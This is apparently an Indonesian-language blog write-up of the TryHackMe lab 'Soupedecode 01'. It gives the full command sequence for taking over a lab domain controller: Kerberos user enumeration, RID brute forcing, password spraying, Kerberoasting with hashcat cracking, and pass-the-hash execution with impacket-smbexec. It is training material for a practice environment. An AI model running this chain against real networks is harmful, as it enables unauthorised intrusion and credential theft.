---
title: "Soupedecode 01"
# date: 2019-04-18T15:34:30-04:00
categories:
  - blog
tags:
  - ctf
  - tryhackme
  - easy
---

### Description ###
Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.

### PoC ###
pertama nmap untuk mendapatkan beberapa informasi penting
```
nmap -sCV 10.201.103.52 --min-rate=1000 -oN nmap -Pn
```
![alt text](/assets/images/tryhackme/soupedecode/image1.png)
terdapat beberapa informasi mengenai port dan services yang sedang barjalan. Tambahkan DNS targe ke //etc/hosts
```
10.201.62.21 SOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL
``` 
Setelah itu mencoba untuk menemukan user yang tepat pada kerberos sesuai dengan yang di intruksikan pada description
```
./kerbrute/kerbrute userenum -d soupedecode.local --dc 10.201.62.21  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 
```
![alt text](/assets/images/tryhackme/soupedecode/image2.png)
setelah mendapatkan beberapa user dengan wordlist menggunakan tols kerbrute, langsung mengeceknya menggunakan netexec untuk mengetahui apakah user tersebut bisa mengkases smb itu.
dan hasilnya nihil
mendapatkan referensi dari:
```
https://0xdf.gitlab.io/2024/03/30/htb-rebound.html#
```
RID cycle attack atau RID brute force adalah teknik untuk mencari akun-akun pengguna di Active Directory dengan menebak nilai Relative Identifier (RID) yang menjadi bagian terakhir dari SID domain. 
menggunakan impacket-lookupsid
```
impacket-lookupsid -no-pass 'guest@soupedecode.local' 8000 | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2 | tee users
```
setelah mendapatkan beberapa user dari impacket-lookupsid, trus coba lagi menggunakan netexec kembali dengan user dan password yang sama
```
netexec smb dc01.soupedecode.local -u users   -p users --no-bruteforce --continue-on-success 
```
![alt text](/assets/images/tryhackme/soupedecode/image3.png)
dan berhasil menemukan user sama passwordnya. dan coba untuk di tes
```
netexec smb dc01.soupedecode.local -u ybob317 -p ybob317 --shares  
```
![alt text](/assets/images/tryhackme/soupedecode/image4.png)
login ke smb menggunakan user sama pass yang didapat dan baca flagnya
![alt text](/assets/images/tryhackme/soupedecode/image5.png)

### PRIVSEC ###
habis itu mencoba mendapatkan hashnya dengan menggunakan impacket-impacket-GetUserSPNs
```
impacket-GetUserSPNs soupedecode.local/ybob317:ybob317 -dc-ip 10.201.62.21 -request
```
![alt text](/assets/images/tryhackme/soupedecode/image6.png)
setelah mendapatkan hashnya lalu crack dengan hashcat
```
hashcat -m 13100 passfile_svc.txt /usr/share/wordlists/rockyou.txt  
```
setalah mendaptkan passwordnya lalu login ke smbnya
```
smbclient //dc01.soupedecode.local/backup -U file_svc
```
![alt text](/assets/images/tryhackme/soupedecode/image7.png)
ambil backup_extracted.txt nya, habis itu coba satu satu combinasi username dan hassnya menggunakan impacket-smbexec
```
impacket-smbexec -hashes :[Spoiler] 'SOUPEDECODE.LOCAL/FileServer$@dc01.soupedecode.local'
```
![alt text](/assets/images/tryhackme/soupedecode/image8.png)

### Flag ###

User.txt = berada dan bisa di baca melalui smb
root.txt = C:\Users\Administrator\Desktop\root.txt
